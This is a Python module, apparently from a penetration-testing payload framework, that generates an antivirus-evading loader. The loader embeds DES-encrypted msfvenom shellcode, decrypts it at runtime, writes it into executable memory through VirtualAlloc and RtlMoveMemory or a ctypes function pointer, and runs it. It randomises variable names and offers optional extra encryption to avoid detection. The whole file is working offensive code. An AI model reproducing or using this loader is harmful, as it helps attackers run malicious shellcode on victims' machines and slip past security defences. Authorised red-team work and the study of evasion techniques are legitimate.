"""

This payload has DES encrypted shellcode stored within itself.  At runtime, the executable
uses the key within the file to decrypt the shellcode, injects it into memory, and executes it.

Great examples and code adapted from 
http://www.laurentluce.com/posts/python-and-cryptography-with-pycrypto/
module by @christruncer

"""

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:
    
    def __init__(self):
        # required options
        self.description = "DES Encrypted shellcode is decrypted at runtime with key in file, injected into memory, and executed"
        self.language = "python"
        self.rating = "Excellent"
        self.extension = "py"
        
        self.shellcode = shellcode.Shellcode()
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"]}
    
    def generate(self):
        if self.required_options["inject_method"][0].lower() == "virtual":
        
            # Generate Shellcode Using msfvenom
            Shellcode = self.shellcode.generate()
        
            # Generate Random Variable Names
            RandPtr = helpers.randomString()
            RandBuf = helpers.randomString()
            RandHt = helpers.randomString()
            ShellcodeVariableName = helpers.randomString()
            RandIV = helpers.randomString()
            RandDESKey = helpers.randomString()
            RandDESPayload = helpers.randomString()
            RandEncShellCodePayload = helpers.randomString()
        
            # encrypt the shellcode and get our randomized key/iv
            (EncShellCode, (DESKey, iv) ) = encryption.encryptDES(Shellcode)

            # Create Payload File
            PayloadCode = 'from Crypto.Cipher import DES\n'
            PayloadCode += 'import ctypes\n'
            PayloadCode += RandIV + ' = \'' + iv + '\'\n'
            PayloadCode += RandDESKey + ' = \'' + DESKey + '\'\n'
            PayloadCode += RandDESPayload + ' = DES.new(' + RandDESKey + ', DES.MODE_CFB, ' + RandIV + ')\n'
            PayloadCode += RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
            PayloadCode += ShellcodeVariableName + ' = bytearray(' + RandDESPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n'
            PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
            PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
            PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
            PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
            PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))'
        
            if self.required_options["use_pyherion"][0].lower() == "y":
                PayloadCode = encryption.pyherion(PayloadCode)
        
            return PayloadCode

        else:

            # Generate Shellcode Using msfvenom
            Shellcode = self.shellcode.generate()
        
            # Generate Random Variable Names
            RandPtr = helpers.randomString()
            RandBuf = helpers.randomString()
            RandHt = helpers.randomString()
            ShellcodeVariableName = helpers.randomString()
            RandIV = helpers.randomString()
            RandDESKey = helpers.randomString()
            RandDESPayload = helpers.randomString()
            RandEncShellCodePayload = helpers.randomString()
            RandShellcode = helpers.randomString()
            RandReverseShell = helpers.randomString()
            RandMemoryShell = helpers.randomString()
        
            # encrypt the shellcode and get our randomized key/iv
            (EncShellCode, (DESKey, iv) ) = encryption.encryptDES(Shellcode)

            # Create Payload File
            PayloadCode = 'from Crypto.Cipher import DES\n'
            PayloadCode += 'from ctypes import *\n'
            PayloadCode += RandIV + ' = \'' + iv + '\'\n'
            PayloadCode += RandDESKey + ' = \'' + DESKey + '\'\n'
            PayloadCode += RandDESPayload + ' = DES.new(' + RandDESKey + ', DES.MODE_CFB, ' + RandIV + ')\n'
            PayloadCode += RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
            PayloadCode += ShellcodeVariableName + ' = ' + RandDESPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\')\n'
            PayloadCode += RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
            PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
            PayloadCode += RandShellcode + '()'

            if self.required_options["use_pyherion"][0].lower() == "y":
                PayloadCode = encryption.pyherion(PayloadCode)
        
            return PayloadCode